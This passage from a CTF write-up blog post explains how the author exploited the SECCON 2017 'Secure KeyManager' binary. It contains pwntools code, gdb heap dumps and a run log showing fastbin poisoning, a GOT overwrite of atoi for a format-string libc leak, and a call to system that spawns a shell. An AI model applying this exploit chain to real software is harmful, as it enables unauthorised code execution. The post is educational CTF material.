+0x603010:   0x4141414141414141  0x4141414141414141
+0x603020:   0x4141414141414141  0x00000000000000e1  &lt;== Chunk 2 (freed)
+0x603030:   0x00007ffff7dd3b58  0x00007ffff7dd3b58  &lt;== Chunk 2 FD/BK
+0x603040:   0x4242424242424242  0x0000424242424242
+0x603050:   0x4343434343434343  0x4343434343434343
+0x603060:   0x4343434343434343  0x4343434343434343
+0x603070:   0x4343434343434343  0x4343434343434343
+0x603080:   0x4343434343434343  0x4343434343434343
+0x603090:   0x0000000000004343  0x0000000000000071  &lt;== Chunk 3 (freed)
+0x6030a0:   0x0000000000000000  0x4444444444444444  &lt;== Chunk 3 FD (currently empty)
+0x6030b0:   0x4444444444444444  0x0000444444444444
+0x6030c0:   0x4545454545454545  0x4545454545454545
+0x6030d0:   0x4545454545454545  0x4545454545454545
+0x6030e0:   0x4545454545454545  0x4545454545454545
+0x6030f0:   0x4545454545454545  0x4545454545454545
+0x603100:   0x00000000000000e0  0x00000000000001c0  &lt;== Chunk 4 (allocated)
+
+gdb-peda$ p main_arena
+$4 = {
+  mutex = 0x0, 
+  flags = 0x0, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x603090, 0x0, 0x0, 0x0, 0x0},                                  &lt;== Chunk 3 
+  top = 0x6032c0, 
+  last_remainder = 0x0, 
+  bins = {0x603020, 0x603020, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;,         &lt;== Chunk 2 
+    0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 
+    0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;, </code></pre></figure>
+
+<p>Now we can create another key with a size matching the one of chunk 2. <code class="language-plaintext highlighter-rouge">malloc</code> will then serve us chunk 2 again, since it’s on top of the bin list, which is overlapping chunk 3, sitting in the fastbin list.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create overlapping chunk and overwrite fastbin FD"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">64</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span>    <span class="c1"># Chunk 3 header
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span>         <span class="c1"># Chunk 3 FD
+</span>
+<span class="n">add_key</span><span class="p">(</span><span class="mi">184</span><span class="p">,</span> <span class="s">"OVERWRITER"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>The chunk, that’s created now, overlaps chunk 3 and overwrites its metadata (and its <code class="language-plaintext highlighter-rouge">FD</code> pointer)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/100gx 0x603000
+0x603000:   0x0000000000000000  0x0000000000000021  &lt;== Chunk 1 (allocated)
+0x603010:   0x4141414141414141  0x4141414141414141
+0x603020:   0x4141414141414141  0x00000000000000e1  &lt;== Chunk 2 (allocated)
+0x603030:   0x544952575245564f  0x00007fff00005245
+0x603040:   0x4242424242424242  0x0000424242424242
+0x603050:   0x4141414141414141  0x4141414141414141
+0x603060:   0x4141414141414141  0x4141414141414141
+0x603070:   0x4141414141414141  0x4141414141414141
+0x603080:   0x4141414141414141  0x4141414141414141
+0x603090:   0x0000000000000000  0x0000000000000071  &lt;== Chunk 3 (freed)
+0x6030a0:   0x00000000006020c0  0x444444444444000a  &lt;== Chunk 3 FD (now pointing to key array)
+0x6030b0:   0x4444444444444444  0x0000444444444444
+0x6030c0:   0x4545454545454545  0x4545454545454545
+0x6030d0:   0x4545454545454545  0x4545454545454545
+0x6030e0:   0x4545454545454545  0x4545454545454545
+0x6030f0:   0x4545454545454545  0x4545454545454545
+0x603100:   0x00000000000000e0  0x00000000000001c1  &lt;== Chunk 4 (allocated)
+
+$ x/30gx 0x6020c0
+0x6020c0 &lt;account&gt;:     0x4141414141414141  0x0000000000000071 &lt;== Account name + fake chunk size 
+0x6020d0:               0x0000000000000000  0x0000000000000000
+0x6020e0 &lt;key_list&gt;:    0x0000000000000000  0x0000000000000000 &lt;== Key array
+0x6020f0 &lt;key_list+16&gt;: 0x0000000000000000  0x0000000000000000
+0x602100 &lt;key_list+32&gt;: 0x0000000000000000  0x0000000000000000
+0x602110 &lt;key_list+48&gt;: 0x0000000000000000  0x0000000000000000
+0x602120 &lt;key_map&gt;:     0x0000000000000000  0x0000000000000000 &lt;== Key map (keys in use)
+0x602130 &lt;master&gt;:      0x4242424242424242  0x0000000000000000 &lt;== Account password</code></pre></figure>
+
+<p>By this, we now have a fastbin chunk, whose <code class="language-plaintext highlighter-rouge">FD</code> pointer points to the fake chunk, we created in the beginning in our <code class="language-plaintext highlighter-rouge">account</code> object. Adding another key with size <code class="language-plaintext highlighter-rouge">0x71</code> will put this <code class="language-plaintext highlighter-rouge">FD</code> pointer into the fastbin list, and the next key, which will be added, will be created on top of the <code class="language-plaintext highlighter-rouge">key list</code> array.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk to get fake FD into fastbin"</span><span class="p">)</span>    
+<span class="n">add_key</span><span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">30</span><span class="p">,</span> <span class="s">"C"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create chunk to overwrite pointer table"</span><span class="p">)</span>
+
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602030</span><span class="p">)</span>           <span class="c1"># key0
+</span><span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>     <span class="c1"># key1
+</span>
+<span class="n">payload2</span> <span class="o">=</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key2
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key3
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key4 (unusable)
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key5
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key6
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>         <span class="c1"># key7
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0101010101010101</span><span class="p">)</span> <span class="c1"># keymap
+</span>
+<span class="n">add_key</span><span class="p">(</span><span class="mi">100</span><span class="o">-</span><span class="mi">32</span><span class="p">,</span> <span class="n">payload1</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span></code></pre></figure>
+
+<p>Adding this key will overwrite the top portion of the bss structure with the <code class="language-plaintext highlighter-rouge">Title</code> in <code class="language-plaintext highlighter-rouge">payload1</code> and the bottom part with <code class="language-plaintext highlighter-rouge">Key</code> in <code class="language-plaintext highlighter-rouge">payload2</code>.</p>
+
+<p>The bss will now look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x6020c0 &lt;account&gt;:     0x4141414141414141  0x0000000000000071 &lt;== Fake chunk
+0x6020d0:               0x4141414141414141  0x4141414141414141
+0x6020e0 &lt;key_list&gt;:    0x0000000000602030  0x000a0000cafebabe &lt;== Our payload data
+0x6020f0 &lt;key_list+16&gt;: 0x000a0000cafebabe  0x000a0000cafebabe
+0x602100 &lt;key_list+32&gt;: 0x00000000006020d0  0x00000000cafebabe
+0x602110 &lt;key_list+48&gt;: 0x00000000cafebabe  0x00000000cafebabe
+0x602120 &lt;key_map&gt;:     0x0101010101010101  0x000000000000000a &lt;== key_map (all keys active)
+0x602130 &lt;master&gt;:      0x4242424242424242  0x0000000000000000</code></pre></figure>
+
+<p>Our first key now points to <code class="language-plaintext highlighter-rouge">0x602030</code> which is inside the <code class="language-plaintext highlighter-rouge">got</code> table</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x602000:   0x0000000000601e28  0x00007ffff7ffe170
+0x602010:   0x00007ffff7deecc0  0x00007ffff7ab7510
+0x602020:   0x00007ffff7aa4f90  0x00000000004006c6 &lt;== puts   / __stack_chk_fail
+0x602030:   0x00007ffff7aabac0  0x00007ffff7aba9e0 &lt;== setbuf / strchr
+0x602040:   0x00007ffff7a8b190  0x0000000000400706 &lt;== printf / malloc_usable_size
+0x602050:   0x00007ffff7b176b0  0x00007ffff7a5c1f0 &lt;== read   / __libc_start_main
+0x602060:   0x00007ffff7acb520  0x00007ffff7ab6f10 &lt;== strcmp / malloc
+0x602070:   0x00007ffff7a70280  0x0000000000000000 &lt;== atoi
+0x602080:   0x0000000000000000  0x0000000000000000
+0x602090:   0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>If we now try to edit <code class="language-plaintext highlighter-rouge">Key 0</code>, <code class="language-plaintext highlighter-rouge">edit_key</code> will call <code class="language-plaintext highlighter-rouge">malloc_usable_size</code> on <code class="language-plaintext highlighter-rouge">0x602030</code> resulting in an allowed size of <code class="language-plaintext highlighter-rouge">0x4006b0</code>, which should be enough for us to overwrite everything we need :)</p>
+
+<p>Since we have no leaks by now, we’ll use this to replace <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">printf</code>. So everytime the <code class="language-plaintext highlighter-rouge">menu</code> handler tries to convert our input to an integer, it will instead call <code class="language-plaintext highlighter-rouge">printf</code> with our input, creating a format string vulnerability.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with printf plt"</span><span class="p">)</span>
+
+<span class="n">newgot</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"read"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>   <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
+<span class="n">newgot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"strcmp"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"malloc"</span><span class="p">]</span> <span class="o">+</span><span class="mi">6</span><span class="p">)</span>
+<span class="n">newgot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>                                         <span class="c1"># atoi got
+</span>
+<span class="n">edit_key</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">newgot</span><span class="p">)</span></code></pre></figure>
+
+<p>For calling something in the menu from now on, we’ll have to consider the fact, that after overwriting <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">printf</code>, the menu handler will no longer be able to convert our input into an integer. Though, printf will return the count of characters printed out, so we can still select <code class="language-plaintext highlighter-rouge">3</code> for examply by just printing 3 characters instead.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">edit_key</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">new_key</span><span class="p">,</span> <span class="n">fakeAtoi</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">fakeAtoi</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"..."</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">ACCOUNT</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">PASS</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="n">fakeAtoi</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="s">"."</span><span class="o">*</span><span class="n">idx</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"..."</span><span class="p">,</span> <span class="n">new_key</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span></code></pre></figure>
+
+<p>So, we’re on the finish line, let’s leak libc address</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC with format string"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%3$p"</span><span class="p">)</span>
+<span class="n">LIBCLEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">)</span>
+    
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc-2.23.so"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">LIBCLEAK</span> <span class="o">-</span> <span class="mh">0xf7230</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBCLEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>With libc on hand, it’s just another overwrite, replacing <code class="language-plaintext highlighter-rouge">atoi</code> with <code class="language-plaintext highlighter-rouge">system</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with system"</span><span class="p">)</span>
+
+<span class="n">newgot</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"read"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span>
+<span class="n">newgot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"strcmp"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"malloc"</span><span class="p">]</span> <span class="o">+</span><span class="mi">6</span><span class="p">)</span>
+<span class="n">newgot</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span>   
+
+<span class="n">edit_key</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">newgot</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">atoi</code> now points to <code class="language-plaintext highlighter-rouge">system</code>. So everything, we now enter in the menu handler, will be passed to <code class="language-plaintext highlighter-rouge">system</code> instead of <code class="language-plaintext highlighter-rouge">printf</code>.</p>
+
+<p>Select <code class="language-plaintext highlighter-rouge">/bin/sh</code> to trigger a shell</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send /bin/sh to trigger shell"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Done…</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python work.py 1
+[*] '/home/kileak/pwn/Challenges/seccon/secure/secure_keymanager'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to secure_keymanager.pwn.seccon.jp on port 47225: Done
+[*] Create initial chunks (fastbins + blocker chunk)
+[*] Recreate first chunk and overwrite second chunk metadat
+[*] Remove second chunk (creates overlapped freed chunk)
+[*] Remove third chunk (put to fastbin list)
+[*] Create overlapping chunk and overwrite fastbin FD
+[*] Create chunk to get fake FD into fastbin
+[*] Create chunk to overwrite pointer table
+[*] Overwrite atoi with printf plt
+[*] Leak LIBC with format string
+[*] '/home/kileak/pwn/Challenges/seccon/secure/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] LIBC leak        : 0x7fcd20214230
+[*] LIBC             : 0x7fcd2011d000
+[*] Overwrite atoi with system
+[*] Send /bin/sh to trigger shell
+[*] Switching to interactive mode
+$ ls
+flag.txt
+secure_keymanager
+$ cat flag.txt
+SECCON{C4n_y0u_b347_h34p_45lr?}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SECCON 2017 Online CTF - Secure KeyManager&amp;url=https://kileak.github.io/ctf/2017/SECCON2017-secure_keymanager/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/SECCON2017-secure_keymanager/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/SECCON2017-secure_keymanager';
+        var disqus_title = 'SECCON 2017 Online CTF - Secure KeyManager';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/SECCON2017-secure_keymanager';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
